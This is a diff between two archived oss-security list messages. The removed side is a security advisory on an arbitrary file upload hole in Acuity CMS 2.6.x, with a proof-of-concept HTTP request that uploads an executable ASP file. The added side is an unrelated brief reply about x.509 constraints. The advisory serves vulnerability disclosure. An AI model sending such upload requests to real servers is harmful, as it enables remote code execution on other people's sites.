@@ -1,101 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/20/4
-Message-ID: <CAPYM6VxWRRUTezftmwnRiGTZkP29beHNr2Qp9bRuN+qEZLLDBA@mail.gmail.com>
-Date: Sun, 20 May 2012 17:48:55 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
-To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
-Subject: Acuity CMS 2.6.x <= Arbitrary File Upload
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/06/27/7
+Message-ID: <20120627151338.GA30716@sentinelchicken.org>
+Date: Wed, 27 Jun 2012 08:13:38 -0700
+From: Tim <tim-security@...tinelchicken.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: please verify unusual x.509 constraints are handled
 Content-Type: text/plain; charset=utf-8
 
-1. OVERVIEW
 
-Acuity CMS 2.6.x (ASP-based) versions are vulnerable to Arbitrary File Upload.
-
-
-2. BACKGROUND
-
-Acuity CMS is a powerful but simple, extremely easy to use, low
-priced, easy to deploy content management system. It is a leader in
-its price and feature class.
+> One thing I always wonder when x509 certificates come into play is
+> where to draw the line between missing feature and vulnerability.
 
 
-3. VULNERABILITY DESCRIPTION
+And usually when you have to ask that kind of question, it's
+indicative of a flawed design...
 
-Acuity CMS 2.6.x (ASP-based) version contain a flaw that may allow an
-attacker to upload .asp/.aspx files without restrictions, which will
-execute ASP(.Net) codes. The issue is due to the script,
-/admin/file_manager/file_upload_submit.asp , not properly sanitizing
-'file1', 'file2', 'file3', 'fileX' parameters.
-
-
-4. VERSIONS AFFECTED
-
-Tested with version 2.6.2.
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
-[REQUEST]
-POST /admin/file_manager/file_upload_submit.asp HTTP/1.1
-Host: localhost
-Cookie: ASPSESSIONID=XXXXXXXXXXXXXXX
-
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="path"
-
-/images
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="rootpath"
-
-/
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="rootdisplay"
-
-http://localhost/
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="status"
-
-confirmed
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="action"
-
-fileUpload
------------------------------6dc3a236402e2
-Content-Disposition: form-data; name="file1"; filename="0wned.asp"
-Content-Type: application/octet-stream
-
-<% response.write("0wned!") %>
-
------------------------------6dc3a236402e2--
-
-[/REQUEST]
-
-
-6. SOLUTION
-
-The Acunity CMS is no longer in active development.
-It is recommended to user another CMS in active development and support.
-
-
-7. VENDOR
-
-The Collective
-http://www.thecollective.com.au/
-
-
-8. CREDIT
-
-Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
-
-
-9. DISCLOSURE TIME-LINE
-
-2012-05-20: vulnerability disclosed
-
-
-10. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/%5Bacuity_cms2.6%20x_(asp)%5D_arbitrary_fileupload
-
-#yehg [2012-05-20]
+tim
